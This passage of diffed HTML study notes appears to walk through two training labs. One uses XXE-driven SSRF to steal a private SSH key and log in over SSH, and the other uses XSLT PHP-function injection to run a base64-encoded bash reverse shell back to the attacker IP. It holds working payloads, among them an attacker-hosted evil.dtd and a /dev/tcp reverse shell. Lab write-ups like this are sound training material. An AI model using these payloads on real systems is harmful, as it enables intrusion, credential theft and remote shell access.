+<span class="n">hex_ip</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter IP (in hex): </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">addr_long</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">hex_ip</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">IP in dotted-decimal notation:</span><span class="sh">"</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="nf">inet_ntoa</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;L</span><span class="sh">"</span><span class="p">,</span> <span class="n">addr_long</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>Convert the hex IP addresses received from /proc/net/tcp file:</p>
+
+<p>Command:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="n">convert</span><span class="p">.</span><span class="n">py</span> 
+</code></pre></div></div>
+
+<p>Once all the IP addresses are converted, look for the internal IPs. In this case, it’s 127.0.0.1 and 127.0.0.11</p>
+
+<p>Let’s also convert the ports from hex to decimal system:</p>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3
+0x0016
+0x22B8
+0x9599
+0x1F40
+</code></pre></div></div>
+
+<blockquote>
+  <p>The ports corresponding to internal IPs are 8000 and 38297, respectively.</p>
+</blockquote>
+
+<p>Step 7: Perform an SSRF attack to interact with internal services.</p>
+
+<p>Check the IP address of the attacker machine:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr
+</code></pre></div></div>
+
+<p>The IP address of the attacker machine is 192.220.76.2</p>
+
+<blockquote>
+  <p>[Note] The IP address of the machines is bound to change with every lab start. Kindly make sure to get the correct IP address before moving on to the next steps. Failing to do that would result in failed exploitation attempts.</p>
+</blockquote>
+
+<p>We will send the following XML snippet to the vulnerable web application:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd"&gt;</span>
+  %dtd;
+  %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Kindly make sure to replace the IP address in the above payload.</p>
+</blockquote>
+
+<p>Before sending the above XXE payload, save the following snippet as evil.dtd:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<p>Start a Python-based HTTP server on port 8080:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8080
+</code></pre></div></div>
+
+<p>Information on the payload:</p>
+
+<p>The first payload (sent to the web app for validation) would load the contents of the evil.dtd file from the attacker machine and then this file would be parsed by the backend.</p>
+
+<p>The evil.dtd file contains the entity that sends a request to localhost:8888 and the result is embedded within the CDATA section.</p>
+
+<p>Information on CDATA:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CDATA sections can be used to "block escape" literal text when replacing 
+prohibited characters with entity references is undesirable.
+</code></pre></div></div>
+
+<ul>
+  <li>Reference: https://www.w3resource.com/xml/CDATA-sections.php</li>
+</ul>
+
+<p>Some examples of prohibited characters are:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;
+,
+<span class="o">&gt;</span>
+,
+&amp;
+,
+<span class="s2">"
+,
+'
+.
+
+</span></code></pre></div></div>
+<p>So, the above payload makes sure that if the response does contain some restricted characters, those characters will get embedded into the CDATA section, and hence the XML validator will raise no errors.</p>
+
+<p>Now we are ready to send the XXE payload:</p>
+
+<p>Notice the response contains a directory listing. It must be some sort of HTTP server.</p>
+
+<blockquote>
+  <p>The response indicates the presence of files like flag1 and directories like .ssh.</p>
+</blockquote>
+
+<p>Head back to the terminal running the Python-based HTTP server:</p>
+
+<ul>
+  <li>
+    <p>Notice there was a request from the target machine to fetch the evil.dtd file.</p>
+  </li>
+  <li>
+    <p>Save the HTML contents received from the internal HTTP server:</p>
+  </li>
+</ul>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>listing.html
+</code></pre></div></div>
+
+<p>Open the listing.html file in the browser:</p>
+
+<p>URL:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file:///root/listing.html
+</code></pre></div></div>
+
+<p>Notice there are 2 entries: <strong>.ssh/</strong> and <strong>flag1</strong>.</p>
+
+<p>Lets fetch these in the subsequent steps.</p>
+
+<blockquote>
+  <p>[Note] The other internal port open on the machine won’t return any information. U r encouraged to interact with it by modifying the
+evil.dtd file to contain the IP and port on which that service is running.</p>
+</blockquote>
+
+<p>Step 8: Retrieve the first flag via XXE.</p>
+
+<p>Modify the evil.dtd file to fetch the contents of file flag1:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/flag1"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<p>Start a Python-based HTTP server on port 8080:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8080
+</code></pre></div></div>
+
+<p>Send the same XXE payload we sent in the last step:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd"&gt;</span>
+  %dtd;
+  %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<p>The contents of flag1 file are retrieved:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag 1: 5f1210be00b4b8dfecba7b56181d905c
+</code></pre></div></div>
+
+<p>Head back to the terminal running the Python-based HTTP server:</p>
+
+<p>Notice there was a request from the target machine to fetch the evil.dtd file.</p>
+
+<p>Step 9: Fetch the contents of the .ssh directory.</p>
+
+<p>Modify the evil.dtd file to fetch the contents of .ssh directory:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/.ssh/"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<p>Start a Python-based HTTP server on port 8080:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8080
+</code></pre></div></div>
+
+<p>Send the same XXE payload we sent in the last step:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd"&gt;</span>
+  %dtd;
+  %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<p>The directory listing for .ssh directory is retrieved:</p>
+
+<p>Save the retrieved HTML contents:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>listing.html
+</code></pre></div></div>
+
+<p>Open the listing.html file in the browser:</p>
+
+<p>URL:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file:///root/listing.html
+</code></pre></div></div>
+
+<p>Notice there are three files in the .ssh directory:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>authorized_keys
+id_rsa
+id_rsa.pub
+</code></pre></div></div>
+
+<p>In the subsequent steps, we will fetch some of these files.</p>
+
+<p>Step 10: Retrieve the private SSH keys.</p>
+
+<p>Modify the evil.dtd file to fetch the contents of id_rsa file:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<p>Start a Python-based HTTP server on port 8080:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 8080
+</code></pre></div></div>
+
+<p>Send the same XXE payload we sent in the last step:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd"&gt;</span>
+  %dtd;
+  %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<p>The response contains the private SSH keys.</p>
+
+<p>Save the contents of the private keys to the id_rsa file:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat id_rsa
+</code></pre></div></div>
+
+<p>The private SSH key is missing the new lines.</p>
+
+<p>To restore the file, we can use the following command:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&amp;\n/" \
+-e "s/-----END RSA PRIVATE KEY-----/\n&amp;/" \
+-e "s/\S\{64\}/&amp;\n/g" \
+id_rsa
+</code></pre></div></div>
+
+<p>The output contains the properly-formatted private SSH key.</p>
+
+<p>The above command does the following: - Adds a new line after the</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
+string - Adds a new line before the
+-----END RSA PRIVATE KEY-----
+string - For all other string blocks, it adds a new line after every 64 characters
+</code></pre></div></div>
+
+<p>Use the following command to save the formatted private key to the file fixed_id_rsa:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&amp;\n/" \
+-e "s/-----END RSA PRIVATE KEY-----/\n&amp;/" \
+-e "s/\S\{64\}/&amp;\n/g" \
+id_rsa &gt; fixed_id_rsa
+</code></pre></div></div>
+
+<p>Check the contents of the fixed_id_rsa file:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat fixed_id_rsa
+</code></pre></div></div>
+
+<p>The well-formatted private SSH key has been placed in a file.</p>
+
+<p>Step 11: Gain SSH access on the target machine.</p>
+
+<p>We have the private SSH key but don’t yet know the user to whom it belongs.</p>
+
+<p>To use the SSH keys for login, we have to find out the corresponding user name. For that, we will be using the public SSH keys. This file could contain the email of the user or the account name followed by the hostname. In either case, we will find the user name.</p>
+
+<p>Modify the evil.dtd file to fetch the contents of the id_rsa.pub file:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<p>Start a Python-based HTTP server on port 8080:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 8080
+</code></pre></div></div>
+
+<p>Send the same XXE payload we sent in the last step:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd"&gt;</span>
+  %dtd;
+  %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<p>The contents of the public SSH key were successfully retrieved.</p>
+
+<p>The email id of the user is also revealed:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@insecure-corp.com
+</code></pre></div></div>
+
+<p>Modify the permissions of the fixed_id_rsa file and SSH into the target machine:</p>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 fixed_id_rsa
+ssh <span class="nt">-i</span> fixed_id_rsa david@demo.ine.local
+</code></pre></div></div>
+
+<blockquote>
+  <p>SSH login was successful!</p>
+</blockquote>
+
+<p>Step 12: Retrieve the second flag.</p>
+
+<p>Now that we have SSH access to the target machine, we can issue commands to perform recon and retrieve all the flags.</p>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+ls
+cat </span>flag1 
+find / <span class="nt">-iname</span> <span class="s1">'flag*'</span> 2&gt;/dev/null 
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag 1 (/home/david/flag1): 5f1210be00b4b8dfecba7b56181d905c
+</code></pre></div></div>
+
+<p>Flag 2 is stored in /tmp/flag2 file:</p>
+
+<p>Command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /tmp/flag2
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag 2: 173b0344950d28e8b5dc36dd462edaa9
+</code></pre></div></div>
+
+<p>With that, we conclude this lab. We have learned to leverage an XXE vulnerability to perform an SSRF attack. Using the SSRF attack, we interacted with an internal HTTP server, got hold of SSH keys for a user, and got shell access on the target machine.</p>
+
+<h3 id="references">References</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 - A4:2017-XML External Entities (XXE)
+2 - A10:2021 – Server-Side Request Forgery (SSRF)
+3 - XML CDATA
+
+1 - https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)
+2 - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+3 - https://www.w3resource.com/xml/CDATA-sections.php
+</code></pre></div></div>
+
+<h2 id="lab-2---xslt-to-code-execution">Lab 2 - XSLT to Code Execution</h2>
+
+<p>Solution</p>
+
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+
+<p>…</p>
+
+<p>Step 2: Check if the provided machine/domain is reachable.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c3</span> demo.ine.local
+</code></pre></div></div>
+
+<p>The provided machine is reachable.</p>
+
+<p>Step 3: Check open ports on the provided machine.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> demo.ine.local
+</code></pre></div></div>
+
+<blockquote>
+  <p>Apache web server is running on port 80 on the target machine.</p>
+</blockquote>
+
+<p>Step 4: Check the web application stack.</p>
+
+<p>We will use curl to check the response headers and identify the application stack:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-I</span> demo.ine.local
+</code></pre></div></div>
+
+<blockquote>
+  <p>Notice the output indicates the web server is Apache (which we already know from the Nmap scan), and the backend web application is PHP-based.</p>
+</blockquote>
+
+<p>Step 5: Check the web pages served on the target machine.</p>
+
+<p>Open the following URL in the browser:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local/
+</code></pre></div></div>
+
+<p>An Online Transformation Service application is provided. It expects an XML and an XSL file to be uploaded by the user. After both the files are uploaded, the XML file is transformed according to the instructions in the XSL file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Information: XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.
+
+Reference: https://www.w3schools.com/xml/xsl_intro.asp
+</code></pre></div></div>
+
+<p>Step 6: Save a test XML file and an XSL file to detect the backend XSLT engine information.</p>
+
+<p>Save the following content as test.xml:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code># test.xml:
+
+<span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="nt">&lt;root&gt;</span>Hello, World!<span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>Save the following content as test.xsl:</p>
+
+<p>test.xsl:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"html"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;h2&gt;</span>XSLT Engine Info:<span class="nt">&lt;/h2&gt;</span>
+  <span class="nt">&lt;b&gt;</span>Version:<span class="nt">&lt;/b&gt;&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:version')"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+  <span class="nt">&lt;b&gt;</span>Vendor:<span class="nt">&lt;/b&gt;&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor')"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+  <span class="nt">&lt;b&gt;</span>Vendor URL:<span class="nt">&lt;/b&gt;&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor-url')"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+  <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div></div>
+
+<p>Notice the contents of the XSL file. It contains the xsl tags to pull the information about the XSLT engine used by the backend:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xsl:version
+xsl:vendor
+xsl:vendor-URL
+</code></pre></div></div>
+
+<p>Step 7: Upload the saved XML file to the server.</p>
+
+<p>Select the XML file to be uploaded:</p>
+
+<ul>
+  <li>Upload the XML file to the server</li>
+  <li>The XML file was successfully uploaded</li>
+</ul>
+
+<p>Step 8: Upload the saved XSL file to the server.</p>
+
+<ul>
+  <li>
+    <p>Select the XSL file to be uploaded</p>
+  </li>
+  <li>
+    <p>Upload the XSL file to the server</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>The XSL file was successfully uploaded</p>
+</blockquote>
+
+<p>Step 9: Transform the XML file according to the uploaded XSL file.</p>
+
+<ul>
+  <li>
+    <p>Click on the transform button to process and transform the XML file according to the uploaded XSL file</p>
+  </li>
+  <li>
+    <p>We are redirected to the /transform.php page containing the XSLT engine details</p>
+  </li>
+</ul>
+
+<p>The backend is running XSLT version 1.0, and the vendor is libxslt, which is one of the popular and widely used XSLT processors.</p>
+
+<p>Step 10: Exploiting XSLT processor to run arbitrary commands.</p>
+
+<blockquote>
+  <p>By now, we have understood that the backend is running PHP and using the libxslt processor. Also, the processor parses the user-supplied files without any sanitization, as far as we have used it.</p>
+</blockquote>
+
+<p>Now we will try to execute PHP functions from the XSL file. This will only work if registerPHPFunctions is enabled for the XSLT processor, as shown in the following post: https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls</p>
+
+<p>To try this, we will upload another XSL file. Head back to the index page of the application:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local
+</code></pre></div></div>
+
+<p>Save the following content under the test.xslt file:</p>
+
+<p>test.xsl:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span>
+<span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- We add the PHP's xmlns --&gt;</span>
+  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;html&gt;</span>
+       <span class="c">&lt;!-- We use the php suffix to call the functions --&gt;</span>
+       <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"php:function('system','uname -a')"</span> <span class="nt">/&gt;</span>
+       <span class="c">&lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;</span>
+    <span class="nt">&lt;/html&gt;</span>
+  <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Notice that we have specified the uname -a command to be executed via the PHP system function.</p>
+</blockquote>
+
+<p>If the backend XSLT processing code has registered PHP functions, then the above code would run, and we will see the output of the uname -a command on the resulting page.</p>
+
+<p>Upload the modified XSL file:</p>
+
+<ul>
+  <li>Now click on the Transform! button</li>
+  <li>Notice the output of the uname -a command is shown on the resulting page:</li>
+</ul>
+
+<blockquote>
+  <p>This confirms the backend XSLT processing code has registered PHP functions. This configuration is inherently vulnerable because the user-supplied XSL files are processed as is, without any sanitization/filtering.</p>
+</blockquote>
+
+<p>Step 11: Obtain a reverse shell on the target server.</p>
+
+<p>Check the IP address of the attacker machine:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr
+</code></pre></div></div>
+
+<p>The IP address of the attacker machine is 192.170.91.2/24.</p>
+
+<blockquote>
+  <p>[Note] The IP address assigned to your Kali GUI instance would certainly be different. Please make sure to replace it in the subsequent commands.</p>
+</blockquote>
+
+<p>Next, we will base64-encode the reverse shell payload to avoid it being tampered with while uploading over HTTP:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash -c 'bash -i&gt;&amp; /dev/tcp/192.170.91.2/54321 0&gt;&amp;1'"</span> | <span class="nb">base64</span> <span class="nt">-w0</span> <span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure to replace the IP address in the above command.</p>
+</blockquote>
+
+<p>Add the reverse shell payload in the XSL file:</p>
+
+<p>test.xsl:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span>
+<span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- We add the PHP's xmlns --&gt;</span>
+  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;html&gt;</span>
+      <span class="c">&lt;!-- We use the php suffix to call the functions --&gt;</span>
+      <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"php:function('system','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash')"</span> <span class="nt">/&gt;</span>
+        <span class="c">&lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;</span>
+      <span class="nt">&lt;/html&gt;</span>
+  <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Notice we have added commands to decode and execute the reverse shell payload on the backend server.</p>
+</blockquote>
+
+<p>Start a Netcat listener on the attacker machine:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 54321
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Upload the modified XSL file:</p>
+  </li>
+  <li>Now click on the Transform! button</li>
+  <li>Notice the page keeps on loading</li>
+  <li>Check the terminal where the Netcat listener was running</li>
+</ul>
+
+<blockquote>
+  <p>We have received back a reverse shell session from the target server.</p>
+</blockquote>
+
+<p>Step 12: Retrieve the flag.</p>
+
+<p>Now that we have a shell session on the target server, we can execute OS commands and perform some enumeration:</p>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+</span>ps aux
+</code></pre></div></div>
+
+<p>Run the following command to locate the flag file:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-iname</span> <span class="k">*</span>flag<span class="k">*</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<blockquote>
+  <p>The flag is present in the /flag.txt file.</p>
+</blockquote>
+
+<p>Read the contents of the flag file:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /flag.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLAG: fdf9c7da429441eaa1620eceafc34d9f
+</code></pre></div></div>
+
+<ul>
+  <li>With that, we conclude this lab on leveraging XSLT for code execution.</li>
+</ul>
+
+<h3 id="references-1">References</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.w3schools.com/xml/xsl_intro.asp
+https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5
+https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-03T00:00:00+06:00">December 3, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=11+-+Server+Side+Attacks%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fserverside%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
